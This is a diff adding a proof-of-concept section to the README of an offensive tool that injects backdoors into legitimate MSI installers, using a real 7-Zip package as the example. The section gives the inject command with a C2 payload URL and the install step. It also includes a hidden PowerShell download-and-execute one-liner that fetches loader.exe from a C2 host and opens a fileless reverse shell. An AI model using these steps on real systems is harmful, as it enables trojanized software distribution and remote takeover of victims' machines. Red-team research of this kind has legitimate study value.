@@ -160,6 +160,69 @@ The resulting MSI will display this metadata in **"Programs and Features"** if i
 
 ## 🔍 Proof-of-Concept (PoC)
 
+#### We can run the tool and see the help menu:
+
+```powershell
+python.exe dfmi.py
+```
+
+<p align="center"> <img src="src/1_mainmenu.png" /> </p>
+
+---
+
+#### First, we can grab a legitimate ``.msi`` installer file, e.g. **"7-Zip"**:
+
+```powershell
+curl https://github.com/ip7z/7zip/releases/download/../7z.msi -o 7z-original.msi
+
+certutil -hashfile "7z-original.msi" sha256 
+```
+
+<p align="center"> <img src="src/0_fetchoriginalfile.png" /> </p>
+
+---
+
+#### Using **"Module 1 - ``inject``"**:
+
+  
+  ```powershell
+  python.exe .\dfmi.py inject "7z-original.msi" "7z-backdoored.msi" --c2 http://<C2>/payload.ps1
+  ```
+
+<p align="center"> <img src="src/2_module1.png" /> </p>
+
+After creating the backdoored file, we can install it simply using:
+
+```powershell
+msiexec.exe /i "7z-backdoored.msi"
+```
+
+*--or, you can double-click and install it*
+
+<p align="center"> <img src="src/3_module1_installation.png" /> </p>
+
+During the installation, our payload gets executed, e.g. ``calc.exe``:
+
+<p align="center"> <img src="src/4_calc_popup.png" /> </p>
+
+In addition to that, we can pop-up a fileless reverse shell connection. Modified content of ``payload.ps1``:
+
+```powershell
+$p=$env:TEMP+'\svc32.exe';(New-Object Net.WebClient).DownloadFile('http://<C2>/loader.exe',$p);Start-Process $p -ArgumentList 'http://<C2>/<MALWARE>' -WindowStyle Hidden
+```
+<p align="center"> <img src="src/5_module1_installation2.png" /> </p>
+
+<p align="center"> <img src="src/6_revshell.png" /> </p>
+
+---
+
+#### Using **"Module 2 - ``rogue-mst``"**:
+
+
+
+---
+
+
 
 
 
